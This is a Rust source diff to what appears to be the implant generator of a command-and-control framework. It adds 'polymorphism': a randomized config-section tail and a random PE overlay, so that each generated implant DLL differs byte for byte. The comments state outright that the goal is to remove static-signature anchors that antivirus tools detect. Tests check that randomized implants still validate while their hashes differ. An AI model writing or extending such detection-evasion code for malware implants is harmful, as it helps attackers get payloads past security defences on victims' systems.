@@ -16,6 +16,9 @@
 //!      (matching the implant's derive_config_key)
 //!    - Encrypt config with config_key, store ciphertext+tag
 //!    - Store implant_priv + server_pub + ciphertext in `.nyx_cfg`
+//!    - Randomize the `.nyx_cfg` tail and append a random PE overlay
+//!      (WP-G polymorphism, first increment — per-generation byte-level
+//!      uniqueness on top of the per-implant keying)
 //!    - Store implant metadata in DB
 //!    - Return the patched binary
 //!
@@ -499,6 +502,130 @@ mod tests {
         // Bare unix seconds are epoch-relative and remain valid for values
         // below the epoch — they are seconds, not civil dates.
         assert_eq!(parse_iso8601_to_unix("0"), Some(0));
+    }
+}
+
+// ── WP-G polymorphism smoke tests (first increment: randomized .nyx_cfg tail
+//    + random PE overlay) ────────────────────────────────────────────────────
+
+#[cfg(test)]
+mod polymorphism_tests {
+    use super::*;
+
+    /// Minimal synthetic DLL template: MZ magic, PE\0\0 signature (via the
+    /// 0x3C pointer), and the 1024-byte `.nyx_cfg` placeholder at offset 1024
+    /// (magic 0x41414141 + 0xAA fill), laid out exactly as
+    /// `implant-tasks/src/config_placeholder.rs::NYX_CFG_PLACEHOLDER` builds it.
+    const PLACEHOLDER_OFF: usize = 1024;
+
+    fn synthetic_template() -> Vec<u8> {
+        let mut t = vec![0u8; 8192];
+        t[0] = 0x4D; // 'M'
+        t[1] = 0x5A; // 'Z'
+        t[0x3C] = 0x80; // PE signature at offset 0x80
+        t[0x80] = 0x50; // 'P'
+        t[0x81] = 0x45; // 'E'
+        t[0x82] = 0x00;
+        t[0x83] = 0x00;
+        t[PLACEHOLDER_OFF] = 0x41;
+        t[PLACEHOLDER_OFF + 1] = 0x41;
+        t[PLACEHOLDER_OFF + 2] = 0x41;
+        t[PLACEHOLDER_OFF + 3] = 0x41;
+        for b in &mut t[PLACEHOLDER_OFF + 4..PLACEHOLDER_OFF + 1024] {
+            *b = 0xAA;
+        }
+        t
+    }
+
+    fn test_request() -> GenerateRequest {
+        GenerateRequest {
+            callback: "192.0.2.1".into(),
+            port: 8443,
+            format: "dll".into(),
+            uri: "/beacon".into(),
+            sleep: 60,
+            jitter: 20,
+            tls: true,
+            features: 0,
+            keying: 0,
+            expires: None,
+            notes: None,
+            deliver: None,
+        }
+    }
+
+    /// Patch the synthetic template end-to-end (keys are fixed dummies — the
+    /// variation under test is the per-generation randomization, not keying).
+    fn patched_binary() -> Vec<u8> {
+        let mut binary = synthetic_template();
+        let req = test_request();
+        let ct = [0x42u8; 120]; // dummy ciphertext+tag, well under the 900 cap
+        patch_implant_template(
+            &mut binary,
+            &req,
+            [0x11; 32],
+            [0x22; 32],
+            [0x33; 12],
+            &ct,
+        )
+        .expect("patch must succeed on the synthetic template");
+        binary
+    }
+
+    /// WP-G 验收 1（哈希差异）：同一模板、同一请求补丁两次，最终产物字节
+    /// 必须不同（随机 .nyx_cfg 尾 + 随机 overlay）。
+    #[test]
+    fn two_generations_from_same_template_differ() {
+        let mut a = patched_binary();
+        let mut b = patched_binary();
+        append_random_overlay(&mut a);
+        append_random_overlay(&mut b);
+        assert_ne!(a, b, "two generations must not be byte-identical");
+    }
+
+    /// WP-G 验收 2（功能等价）：随机化后产物仍通过全部补丁后校验，且功能
+    /// 区域（段头 86 字节 + 密文）逐字节确定 —— 只有死区尾部被随机化。
+    #[test]
+    fn patched_binary_still_valid_and_functional_region_deterministic() {
+        let a = patched_binary();
+        let b = patched_binary();
+        // Generation-time validation must accept both randomized binaries.
+        validate_patched_pe(&a, PLACEHOLDER_OFF).expect("binary A must validate");
+        validate_patched_pe(&b, PLACEHOLDER_OFF).expect("binary B must validate");
+        // Header + ciphertext (bytes 0..86+120 of the section) are identical
+        // across generations given identical inputs; the randomized tail
+        // (bytes 206..1024) must differ and must not be all-zero.
+        let data_end = 86 + 120;
+        assert_eq!(
+            a[PLACEHOLDER_OFF..PLACEHOLDER_OFF + data_end],
+            b[PLACEHOLDER_OFF..PLACEHOLDER_OFF + data_end],
+        );
+        let tail_a = &a[PLACEHOLDER_OFF + data_end..PLACEHOLDER_OFF + 1024];
+        let tail_b = &b[PLACEHOLDER_OFF + data_end..PLACEHOLDER_OFF + 1024];
+        assert_ne!(tail_a, tail_b, "tail must be randomized per generation");
+        assert!(
+            tail_a.iter().any(|&x| x != 0),
+            "tail must not be the old all-zero padding"
+        );
+    }
+
+    /// Overlay：原内容逐字节保留、长度落在约定区间、两次追加不同。
+    #[test]
+    fn overlay_preserves_prefix_and_varies() {
+        let base = patched_binary();
+        let base_len = base.len();
+        let mut a = base.clone();
+        let mut b = base;
+        append_random_overlay(&mut a);
+        append_random_overlay(&mut b);
+        assert!(a.len() >= base_len + 128 && a.len() < base_len + 128 + 4096);
+        assert!(b.len() >= base_len + 128 && b.len() < base_len + 128 + 4096);
+        // The patched image (including the .nyx_cfg patch) is untouched.
+        assert_eq!(a[..base_len], b[..base_len]);
+        // Two random overlays are (overwhelmingly) distinct.
+        assert_ne!(a, b);
+        // Header checks still pass on the overlaid binary (offset-based).
+        check_patched_pe_headers(&a).expect("overlay must not disturb headers");
     }
 }
 
@@ -996,10 +1123,41 @@ fn write_nyx_cfg_section(
 
     // Encrypted config + tag at byte 86
     section[86..86 + data_len].copy_from_slice(ct_with_tag);
-    // Zero-pad the rest
-    for b in &mut section[86 + data_len..] {
-        *b = 0;
-    }
+    // Randomize the remaining tail instead of zero-padding (WP-G L2, first
+    // increment): the implant only ever reads the header (bytes 0..86) plus
+    // exactly `data_len` bytes of ciphertext — see
+    // `crates/implant-tasks/src/config_placeholder.rs::load_runtime_config_unmask_keys`
+    // — so the tail is dead space. Zero-filling it gave every generated
+    // implant an identical ~900-byte run of 0x00 at a fixed section offset,
+    // a stable static-signature anchor. OsRng bytes make the tail differ on
+    // every generation at zero functional cost.
+    rand::rngs::OsRng.fill_bytes(&mut section[86 + data_len..]);
+}
+
+/// Append a random-length, random-content PE overlay to a patched implant
+/// binary (WP-G L2, first increment).
+///
+/// A PE overlay is data past the end of the last section's raw extent; the
+/// Windows loader maps only what the section headers describe, so overlay
+/// bytes never affect execution. The template is unsigned (no
+/// IMAGE_DIRECTORY_ENTRY_SECURITY certificate table to invalidate), the
+/// implant never re-reads its own image from disk, and every downstream
+/// consumer (`validate_patched_pe`, SHA-256, `size_bytes`, the store record)
+/// works on the final byte vector — so appending here is offset-safe.
+///
+/// Effect: two implants generated from the same template with the same
+/// request differ in total size and in their trailing bytes, removing the
+/// "same template ⇒ same file length + same tail" signature anchor.
+fn append_random_overlay(binary: &mut Vec<u8>) {
+    // Length in [OVERLAY_MIN, OVERLAY_MIN + 4096). Non-zero minimum keeps the
+    // overlay a reliable feature (a 0-length draw would be a no-op); the
+    // 4 KiB spread covers the size range of common benign overlays (update
+    // payloads, installer stubs) without meaningfully growing the artifact.
+    const OVERLAY_MIN: usize = 128;
+    let len = OVERLAY_MIN + (rand::rngs::OsRng.next_u32() as usize % 4096);
+    let start = binary.len();
+    binary.resize(start + len, 0);
+    rand::rngs::OsRng.fill_bytes(&mut binary[start..]);
 }
 
 /// Re-validate the patched PE before computing SHA-256 and storing.
@@ -1218,7 +1376,10 @@ pub async fn generate_implant(
     // 5. Encrypt config with ChaCha20-Poly1305.
     let ct_with_tag = encrypt_implant_config(config_key, config_nonce, &config_plaintext)?;
 
-    // 6. Patch the DLL template.
+    // 6. Patch the DLL template, then append a random PE overlay (WP-G L2):
+    // per-generation size/tail variance on top of the randomized .nyx_cfg
+    // tail. Overlay is appended AFTER the in-section patch + validation; it
+    // changes no header or section offset, so the patched layout is untouched.
     let mut binary = (**template).clone();
     patch_implant_template(
         &mut binary,
@@ -1228,6 +1389,7 @@ pub async fn generate_implant(
         config_nonce,
         &ct_with_tag,
     )?;
+    append_random_overlay(&mut binary);
 
     // 7. Store implant metadata and build response.
     let response = store_and_audit_implant(
